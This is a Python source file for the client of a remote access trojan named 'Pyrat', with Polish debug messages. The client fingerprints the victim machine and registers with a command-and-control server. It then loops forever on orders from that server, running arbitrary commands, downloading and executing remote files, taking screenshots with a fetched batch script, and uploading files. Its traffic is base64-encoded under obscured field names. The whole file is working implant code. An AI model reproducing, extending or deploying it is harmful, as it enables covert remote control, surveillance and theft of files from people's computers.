# -*- coding: utf-8 -*-

"""

All lines commented with #hash without additional informations, are debug lines.
There are no necessary to use them during normal operation.

"""


import subprocess
import re
import shutil
from uuid import getnode as get_mac
import os
import platform
import socket
import requests
import tkinter as tk
from tkinter import messagebox
import base64
import time
import json


"""

Code below detect basic client parameters.
All is from stackoverflow - this is not my invention.

"""


det_mac = ''.join(("%012X" % get_mac())[i:i+2] for i in range(0, 12, 2))
det_os = (platform.system() + platform.release())
det_name = os.environ['COMPUTERNAME']
det_int_ip = [l for l in ([ip for ip in socket.gethostbyname_ex(socket.gethostname())[2] if not ip.startswith("127.")][:1],
                         [[(s.connect(('8.8.8.8', 53)), s.getsockname()[0], s.close()) for s in
                           [socket.socket(socket.AF_INET, socket.SOCK_DGRAM)]][0][1]]) if l][0][0]
det_ext_ip = requests.get('https://api.ipify.org').text

my_headers = requests.utils.default_headers()
my_headers.update({
        'User-Agent': 'Pyrat_Client_Beta',
    })
s = requests.Session()

#home_host = 'http://uw471.mikr.us'
home_host = 'http://127.0.0.1:8000'


"""

Function that connect PC to remote CC server.
There are basic informations necessary to register PC (or update if PC exists, but
this will be made by server side).

"""
def send_request(page, data, *args):

    enc_data = base64.b64encode((str(data).replace('\'', '"')).encode('UTF-8')).decode('UTF-8')
    payload = {
        'a3Vyd': enc_data
    }
    if len(args) == 1:
        say_hello = s.post(home_host+'/'+page+'/', data=payload, headers=my_headers, files=args[0])
    else:
        say_hello = s.post(home_host+'/'+page+'/', data=payload, headers=my_headers)
    print(say_hello.text)
    return say_hello


def register_at_db():

    cli_data = {
        'det_mac': det_mac,
        'det_os': det_os,
        'det_name': det_name,
        'det_int_ip': det_int_ip,
        'det_ext_ip': det_ext_ip,
    }
    print(cli_data)
    send_request('register', cli_data)


"""

Results from executed command, are send in decoded format.
This was made as additional security xD...
Really, only for training with encoding.

"""


def send_result(result, last_activity, det_mac, uniqueid):
    #print(result)
    cli_data = {
        "func_result": result,
        "last_activity": last_activity,
        "det_mac": det_mac,
        "uniqueid": uniqueid
    }
    #print(cli_data)
    send_request('result', cli_data)


"""

Ping function, which identify PC as iddle (by server side)

"""


def ping(last_activity, det_mac):
    cli_data = {
        'last_activity': last_activity,
        'det_mac': det_mac
    }
    send_request('ping', cli_data)
    confirmation = 'Pong'
    return confirmation


"""

Function that allows to run any command. If you want use cmd.exe, the command should be called from system32 folder.
Obligatory-necessared is only command, arguments are optional. New list params_list should be created, due to
isufficient [space] key and error during run arguments ['dirC:' instead 'dir C:'].

"""


def run_command(command, *args):
    #print(args)
    params_list = []
    for a in args:
        params_list.append(a + ' ')
    s = '\, '
    s.join(params_list)
    print(params_list)
    execute = subprocess.run([command, params_list], stdout=subprocess.PIPE)
    if 'stdout=b\'\'' in str(execute):
        result = f'''Command {command} executed with no output'''
    else:
        result = (re.search('stdout=b(.*)\)', str(execute)).group(1)).replace('\'', '')
    print(result)
    print('Command executed')
    return str(result)


"""

Function that allow to download file via requests library. First two arguments are necessary.
Third is optional - if you will add 'y' the downloaded file automatically runs throught run_command
function.

"""


def downloader(url, path, *args):
    savefilename = url.split('/')[-1]
    r = requests.get(url, stream=True)
    with open(path + '\\' + savefilename, 'wb') as f:
        shutil.copyfileobj(r.raw, f)
    print('Download completed.')
    if len(args) > 0 and args[0] == 'y':
        run_command(path + '\\' + savefilename)
        confirmation = 'File %s downloaded, executed' % url
        return confirmation
    else:
        print('Not requested to run downloaded file.')
        confirmation = 'File %s downloaded, not executed' % url
        return confirmation


"""

Simple function that show message box.
Additional window from TK drawer will be hidded.

"""


def popup(text, title, *args):
    r_window = tk.Tk()
    r_window.withdraw()
    print(text)
    print(title)
    if '%' in text or title:
        messagebox.showinfo(text.replace('%', ' '), title.replace('%', ' '))
    else:
        messagebox.showinfo(text, title)
    confirmation = 'Messagebox showed'
    return confirmation


"""

The function that allows to make screenshot.
First, the great self-compiling script will be downloaded from remote server,
and during run, it will be compilled via .NET package (script by Vasil Arnaudov - you are great man!).
Name of screenshot is a filtered MAC (without :) and current time.

"""


def screenshot(*args):
    curr_user = os.getlogin()
    sys_disk = os.getenv("SystemDrive")
    print(sys_disk)
    app_url = 'https://raw.githubusercontent.com/npocmaka/batch.scripts/master/hybrids/.net/c/screenCapture.bat'
    app_dir = sys_disk + '\\Users\\' + curr_user + '\\AppData\\Local\\Temp\\'
    print(app_dir)
    r = s.get(app_url)
    with open(app_dir + 'screenCapture.bat', 'w') as f:
        f.write(r.text)
    screen_name = (str(time.strftime("%Y%m%d-%H%M%S")) + '_' + det_mac)
    print(screen_name)
    run_command(sys_disk + '\\windows\\system32\\cmd.exe', '/C', 'cd ' + app_dir, '&&', 'screenCapture.bat', screen_name + '.jpg')
    fileupload(app_dir + screen_name + '.jpg')
    confirmation = 'Screenshot %s.jpg uploaded' % screen_name
    return confirmation


def fileupload(file_path, *args):
    if os.path.isfile(file_path) == True:
        cli_data = {
            'det_mac': det_mac
        }
        file = {
            'f1L3': open(file_path, 'rb')
        }
        #say_file = s.post(home_host + '/upload/', files=file, data=payload)
        send_request('upload', cli_data, file)
        confirmation = 'File %s uploaded' % file_path
    else:
        confirmation = 'File %s not exists' % file_path
    return confirmation


"""

There is a main procedure of client.
At the beginning, we have two lists: with received ID's of command, and with send ID's of executed
commands.
This should prevent from duplicated command executions.

"""


received_ids = []
send_commands = []


"""

PC try to connect to remote server - in range 0 to 100
If exception (ANY) will occur, the loop back to beginning.

"""

for i in range (0,100):
    try:
        print('++++ PROBUJE POLACZYC Z CC ++++')
        register_at_db()
    except Exception as e:
        print('++++ NIEPOWODZENIE, SLEEP NA 30 SEKUND ++++')
        print(e)
        time.sleep(30)
        continue
    break


"""

Infinite loop - to get and execute commands fetched from remote CC server.
If exceptions will be occured - the loop back to beginning.

"""


cli_data = {
        'det_mac': det_mac
    }

while True:
    try:
    #if 1 == 1:
        print('++++ NOWA ITERCJA, DRUKUJE LISTY ++++')
        print('Otrzymane id %s' % received_ids)
        print('Wysłane rezultaty o id %s ' % send_commands)
        # List of available commands
        command_dict = {
            'popup': popup,
            'run_command': run_command,
            'downloader': downloader,
            'screenshot': screenshot,
            'upload': fileupload
        }
        say_ready = send_request('order', cli_data)
        resp_data = say_ready.json()
        resp_dict = json.loads(base64.b64decode(resp_data['65hFDs']).decode('utf-8'))
        print(resp_dict)
        time_curr = time.strftime('%Y-%m-%d %H:%M:%S')
        # The pong is necessary, if ID was executed earlier
        pong = time_curr
        # If command from list of commands is in fetched data
        if any(command in resp_dict['function'] for command in command_dict):
            # Check that command was not already executed
            if resp_dict['uniqueid'] not in received_ids:
                # Search for command in fetched data
                print('++++ ZNALEZIONO FUNKCJE: %s ++++' % resp_dict['function'])
                print('++++ DODATKOWE ARGUMENTY: %s ++++' % resp_dict['params'])
                command_to_run = command_dict[resp_dict['function']]
                result_from_run = command_to_run(*resp_dict['params'])
                received_ids.append(resp_dict['uniqueid'])
                # Check, that executed in a few moments command was already send or not
                if resp_dict['uniqueid'] not in send_commands:
                    print('++++ WYSYLAM REZULTAT WYKONANEGO POLECENIA %s O uniqueid %s ++++' %
                          (resp_dict['function'], resp_dict['uniqueid']))
                    send_result(result_from_run, time_curr, det_mac, resp_dict['uniqueid'])
                    send_commands.append(resp_dict['uniqueid'])
                else:
                    print('++++ ODPOWIEDŹ NA POLECENIE %s O uniqueid %s JUŻ WYSLANA ++++' %
                          (resp_dict['function'], resp_dict['uniqueid']))
            else:
                # If command was already executed - make a pong (inform CC that client is in iddle state)
                print('++++ uniqueid %s JEST JUZ NA LISCIE, POLECENIE WCZESNIEJ WYKONANE ++++' % resp_dict['uniqueid'])
                print('++++ NIC NIE WYKONALEM, WYSYLAM PONG ++++')
                #print(pong)
                ping(pong, det_mac)
        else:
            # If there is no client MAC on list or command is unrecognized - inform CC that client is in iddle state.
            print('++++ NIE ZNAM TAKIEGO POLECENIA ALBO NIE MA MOJEGO MAC NA LISCIE, WYSYLAM PONG ++++')
            ping(pong, det_mac)
    # If there is an exception (no connection or something) - go to the beginning of the loop
    except Exception as e:
        print(e)
        continue
    print('++++ SLEEP NA 10 SEKUND ++++')
    time.sleep(10)

